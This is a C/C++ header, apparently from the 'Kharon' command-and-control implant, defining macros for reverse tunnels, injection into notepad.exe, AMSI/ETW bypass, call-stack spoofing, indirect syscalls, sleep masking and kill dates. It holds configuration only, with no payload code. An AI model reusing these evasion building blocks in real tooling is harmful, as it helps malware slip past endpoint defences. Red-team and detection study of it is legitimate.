#ifndef DEFINES_H
#define DEFINES_H

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

/* ========= [ class macro ] ========= */
#define MAX_RECEIVE_BUFFER (16 * 1024 * 1024) 
#define max(a, b) (((a) > (b)) ? (a) : (b))
#define min(a, b) ((a) < (b) ? (a) : (b))
#define POST_EX_BUFFER_LENGTH 4 + 8 + 4 + 8 

#define MAX_SOCKET_DATA_SIZE (1024 * 1024)
#define max(a,b) (((a) > (b)) ? (a) : (b))

#define COPY_WEB_ARRAY(dest, src, qty) \
    if ( (dest) ) Mem::Copy( (dest), (src), (qty) * sizeof( PVOID ) ) 

#define RTL_CONSTANT_OBJECT_ATTRIBUTES ( x, y ) { sizeof(OBJECT_ATTRIBUTES), NULL, x, y, NULL, NULL }

#define G_SYM( x )	( ULONG_PTR )( StartPtr() - ( ( ULONG_PTR ) & StartPtr - ( ULONG_PTR ) x ) )

#define INT3BRK asm("int3");

#define PAGE_SIZE 0x1000
#define PAGE_ALIGN( x ) ( ( (ULONG_PTR) x ) + ( ( PAGE_SIZE - ( ( (ULONG_PTR)x ) & ( PAGE_SIZE - 1 ) ) ) % PAGE_SIZE ) )

#ifdef DEBUG
#define KhDbg( x, ... ) {  \
    Self->Ntdll.DbgPrint(  \
        ( "[DEBUG::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ );  \
    }
    // Self->Msvcrt.printf(  \
        // ( "[DEBUG::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ );  \

#define KhDbgz( x, ... ) {  \
    Ntdll.DbgPrint(  \
        ( "[DEBUG::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ );  \
    }
    // Msvcrt.printf(   \
        // ( "[DEBUG::%s::%s::%d] => " x "\n" ), __FILE__ ,__FUNCTION__, __LINE__, ##__VA_ARGS__ );  \

#define KH_DBG_MSG KhDbg( "dbg" );
#else
#define KhDbgz( x, ... );
#define KhDbg( x, ... );
#define KH_DBG_MSG
#endif

#define DECLAPI( x )  decltype( x ) * x
#define DECLTYPE( x ) ( decltype( x ) )
#define DECLFN        __attribute__( ( section( ".text$B" ) ) )

#define G_PARSER          Self->Psr->Shared
#define G_PACKAGE         Self->Pkg->Shared
#define BEG_BUFFER_LENGTH  0x1000
#define PIPE_BUFFER_LENGTH 0x10000

#define CFG_HOST_ACTID_ADD 0x10
#define CFG_HOST_ACTID_RM  0x20

#define TASK_HEADER_SIZE ( sizeof(ULONG) + sizeof(CHAR) + 8 + sizeof(ULONG) )

#ifdef DEBUG
#define SendDbgMsg( x, ... )  Self->Pkg->FmtMsg( CALLBACK_NO_PRE_MSG, x, ##__VA_ARGS__ )
#define SendDbgErr( x, ... )  Self->Pkg->FmtMsg( CALLBACK_NO_PRE_MSG, x, ##__VA_ARGS__ )
#else
#define SendDbgMsg( x, ... ) 
#define SendDbgErr( x, ... ) 
#endif

#define QuickMsg( x, ... )     Self->Pkg->FmtMsg( CALLBACK_NO_PRE_MSG, x, ##__VA_ARGS__ )
#define QuickErr( x, ... )     Self->Pkg->FmtMsg( CALLBACK_ERROR,      x, ##__VA_ARGS__ )
#define QuickOut( x, y, z )    Self->Pkg->SendOut( CALLBACK_NO_PRE_MSG, x, y, z )

#define KhAlloc( x )       Self->Hp->Alloc( x )
#define KhReAlloc( x, y )  Self->Hp->ReAlloc( x, y )
#define KhFree( x )        Self->Hp->Free( x )

/*============== [ Dereference ] ==============*/

#define DEF( x )   ( * ( PVOID*  ) ( x ) )
#define DEFB( x )  ( * ( BYTE*   ) ( x ) )
#define DEF08( x ) ( * ( UINT8*  ) ( x ) )
#define DEF16( x ) ( * ( UINT16* ) ( x ) )
#define DEF32( x ) ( * ( UINT32* ) ( x ) )
#define DEF64( x ) ( * ( UINT64* ) ( x ) )

/*============== [ Casting ] ==============*/

#define C_PTR_AS( type, ptr ) reinterpret_cast<type>( ptr )

#define PTR( x )    reinterpret_cast<PVOID>( x )
#define U_PTR( x )  reinterpret_cast<UPTR>( x )
#define B_PTR( x )  reinterpret_cast<BYTE*>( x )
#define UC_PTR( x ) reinterpret_cast<PUCHAR>( x )

#define A_PTR( x )   reinterpret_cast<PCHAR>( x )
#define W_PTR( x )   reinterpret_cast<PWCHAR>( x )

#define U_64( x ) reinterpret_cast<UINT64>( x )
#define U_32( x ) reinterpret_cast<UINT32>( x )
#define U_16( x ) reinterpret_cast<UINT16>( x )
#define U_8( x )  reinterpret_cast<UINT8>( x )

/*============== [ Tunnel ] ==============*/

#define COMMAND_TUNNEL_START_TCP 62
#define COMMAND_TUNNEL_START_UDP 63
#define COMMAND_TUNNEL_WRITE_TCP 64
#define COMMAND_TUNNEL_WRITE_UDP 65
#define COMMAND_TUNNEL_CLOSE     66
#define COMMAND_TUNNEL_REVERSE   67
#define COMMAND_TUNNEL_ACCEPT    68

#define TUNNEL_STATE_CLOSE   1
#define TUNNEL_STATE_READY   2
#define TUNNEL_STATE_CONNECT 3

#define TUNNEL_MODE_SEND_TCP 0
#define TUNNEL_MODE_SEND_UDP 1
#define TUNNEL_MODE_REVERSE_TCP 2

/* ========= [ Config ] ========= */

#define KH_JOB_TERMINATE  0x010
#define KH_JOB_READY_SEND 0x050
#define KH_JOB_SUSPENDED  0x100
#define KH_JOB_HIBERN     0x150
#define KH_JOB_RUNNING    0x200
#define KH_JOB_PRE_START  0x300

#ifndef KH_GUARDRAILS_USER
#define KH_GUARDRAILS_USER nullptr
#endif // KH_GUARDRAILS_USER

#ifndef KH_GUARDRAILS_HOST
#define KH_GUARDRAILS_HOST nullptr
#endif // KH_GUARDRAILS_HOST

#ifndef KH_GUARDRAILS_IPADDRESS 
#define KH_GUARDRAILS_IPADDRESS nullptr
#endif // KH_GUARDRAILS_IPADDRESS

#ifndef KH_GUARDRAILS_DOMAIN
#define KH_GUARDRAILS_DOMAIN nullptr
#endif // KH_GUARDRAILS_DOMAIN

#ifndef KH_WORKTIME_ENABLED
#define KH_WORKTIME_ENABLED 0
#endif // KH_WORKTIME_ENABLED

#ifndef KH_WORKTIME_START_HOUR
#define KH_WORKTIME_START_HOUR 0
#endif // KH_WORKTIME_HOUR

#ifndef KH_WORKTIME_START_MIN
#define KH_WORKTIME_START_MIN 0
#endif // KH_WORKTIME_MIN

#ifndef KH_WORKTIME_END_HOUR
#define KH_WORKTIME_END_HOUR 0
#endif // KH_WORKTIME_END_HOUR

#ifndef KH_WORKTIME_END_MIN
#define KH_WORKTIME_END_MIN 0
#endif // KH_WORKTIME_END_MIN

#ifndef KH_KILLDATE_DAY
#define KH_KILLDATE_DAY 0
#endif // KH_KILLDATE_DAY

#ifndef KH_KILLDATE_MONTH
#define KH_KILLDATE_MONTH 0
#endif // KH_KILLDATE_MONTH

#ifndef KH_KILLDATE_YEAR
#define KH_KILLDATE_YEAR 0
#endif // KH_KILLDATE_YEAR

#define KH_CHUNK_SIZE 512000 // 512 KB

#define KH_METHOD_INLINE 0x15
#define KH_METHOD_FORK   0x20

#define KH_INJECT_EXPLICIT 0x100
#define KH_INJECT_SPAWN    0x200

#ifndef KH_AGENT_UUID
#define KH_AGENT_UUID "f47ac10"
#endif // KH_AGENT_UUID

#ifndef KH_SLEEP_TIME
#define KH_SLEEP_TIME 3
#endif // KH_SLEEP_TIME

#ifndef KH_JITTER
#define KH_JITTER 0
#endif // KH_JITTER

#ifndef KH_AMSI_ETW_BYPASS
#define KH_AMSI_ETW_BYPASS 0
#endif // KH_AMSI_ETW_BYPASS

#ifndef KH_BOF_HOOK_ENABLED
#define KH_BOF_HOOK_ENABLED FALSE
#endif // KH_BOF_HOOK_ENALED

#ifndef KH_KILLDATE_ENABLED
#define KH_KILLDATE_ENABLED FALSE
#endif // KH_KILLDATE_ENABLED

#ifndef KH_SPAWNTO_X64
#define KH_SPAWNTO_X64 L"C:\\Windows\\System32\\notepad.exe"
#endif // KH_SPAWNTO_X64

#ifndef KH_FORK_PIPE_NAME
#define KH_FORK_PIPE_NAME "\\\\.\\pipe\\kharon_pipe"
#endif // KH_FORK_PIPE_NAME

#ifndef KH_CRYPT_KEY
#define KH_CRYPT_KEY { 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50 }
#endif

#ifndef KH_HEAP_MASK
#define KH_HEAP_MASK FALSE
#endif // KH_HEAP_MASK

#ifndef KH_SYSCALL
#define KH_SYSCALL 0
#endif // KH_SYSCALL

// Frame 1
#ifndef KH_SPOOF_FRAME_1_MODULE
#define KH_SPOOF_FRAME_1_MODULE   "ntdll"
#endif

#ifndef KH_SPOOF_FRAME_1_FUNC
#define KH_SPOOF_FRAME_1_FUNC     "RtlUserThreadStart"
#endif

#ifndef KH_SPOOF_FRAME_1_OFFSET
#define KH_SPOOF_FRAME_1_OFFSET   0x21
#endif

// Frame 2
#ifndef KH_SPOOF_FRAME_2_MODULE
#define KH_SPOOF_FRAME_2_MODULE   "kernel32"
#endif

#ifndef KH_SPOOF_FRAME_2_FUNC
#define KH_SPOOF_FRAME_2_FUNC     "BaseThreadInitThunk"
#endif

#ifndef KH_SPOOF_FRAME_2_OFFSET
#define KH_SPOOF_FRAME_2_OFFSET   0x14
#endif

// Frame 3
#ifndef KH_SPOOF_FRAME_3_MODULE
#define KH_SPOOF_FRAME_3_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_3_FUNC
#define KH_SPOOF_FRAME_3_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_3_OFFSET
#define KH_SPOOF_FRAME_3_OFFSET   0x0
#endif

// Frame 4
#ifndef KH_SPOOF_FRAME_4_MODULE
#define KH_SPOOF_FRAME_4_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_4_FUNC
#define KH_SPOOF_FRAME_4_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_4_OFFSET
#define KH_SPOOF_FRAME_4_OFFSET   0x0
#endif

// Frame 5
#ifndef KH_SPOOF_FRAME_5_MODULE
#define KH_SPOOF_FRAME_5_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_5_FUNC
#define KH_SPOOF_FRAME_5_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_5_OFFSET
#define KH_SPOOF_FRAME_5_OFFSET   0x0
#endif

// Frame 6
#ifndef KH_SPOOF_FRAME_6_MODULE
#define KH_SPOOF_FRAME_6_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_6_FUNC
#define KH_SPOOF_FRAME_6_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_6_OFFSET
#define KH_SPOOF_FRAME_6_OFFSET   0x0
#endif

// Frame 7
#ifndef KH_SPOOF_FRAME_7_MODULE
#define KH_SPOOF_FRAME_7_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_7_FUNC
#define KH_SPOOF_FRAME_7_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_7_OFFSET
#define KH_SPOOF_FRAME_7_OFFSET   0x0
#endif

// Frame 8
#ifndef KH_SPOOF_FRAME_8_MODULE
#define KH_SPOOF_FRAME_8_MODULE   nullptr
#endif

#ifndef KH_SPOOF_FRAME_8_FUNC
#define KH_SPOOF_FRAME_8_FUNC     nullptr
#endif

#ifndef KH_SPOOF_FRAME_8_OFFSET
#define KH_SPOOF_FRAME_8_OFFSET   0x0
#endif

#ifndef KH_CHUNKSIZE
#define KH_CHUNKSIZE 0x500000 //5Mb
#endif // KH_CHUNKSIZE

#ifndef KH_SLEEP_MASK_TECHNIQUE
#define KH_SLEEP_MASK_TECHNIQUE eMask::Timer
#endif // KH_SLEEP_MASK_TECHNIQUE

#ifndef KH_SLEEP_MASK_CHAIN_LOGIC
#define KH_SLEEP_MASK_CHAIN_LOGIC 0
#endif // KH_SLEEP_MASK_CHAIN_LOGIC

#ifndef KH_SLEEP_MASK_JMP_GADGET
#define KH_SLEEP_MASK_JMP_GADGET eJmpReg::vRbx
#endif // KH_SLEEP_MASK_JMP_GADGET

#define x64_OPCODE_RET			0xC3
#define x64_OPCODE_MOV			0xB8
#define	x64_SYSCALL_STUB_SIZE   0x20

#define SYSCALL_NONE            0
#define SYSCALL_SPOOF           1
#define SYSCALL_SPOOF_INDIRECT  2

#define SYS_ADDR( sys_id ) \
    ( Flags == SYSCALL_SPOOF_INDIRECT )          \
    ? (UPTR)Self->Sys->Ext[ sys_id ].Instruction \
    : (UPTR)Self->Sys->Ext[ sys_id ].Address

#define SYS_SSN( sys_id ) \
    (Flags == SYSCALL_SPOOF_INDIRECT)      \
    ? (UPTR)Self->Sys->Ext[ sys_id ].ssn   \
    : 0;

#define KHARON_HEAP_MAGIC 0x545152545889

#define G_KHARON Root::Kharon* Self = []() -> Root::Kharon* { \
    PEB* peb = NtCurrentPeb(); \
    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
        Root::Kharon* potentialKharon = reinterpret_cast<Root::Kharon*>(peb->ProcessHeaps[i]); \
        if (potentialKharon && potentialKharon->MagicValue == KHARON_HEAP_MAGIC) { \
            return potentialKharon; \
        } \
    } \
    return nullptr; \
}();


#endif // DEFINES_H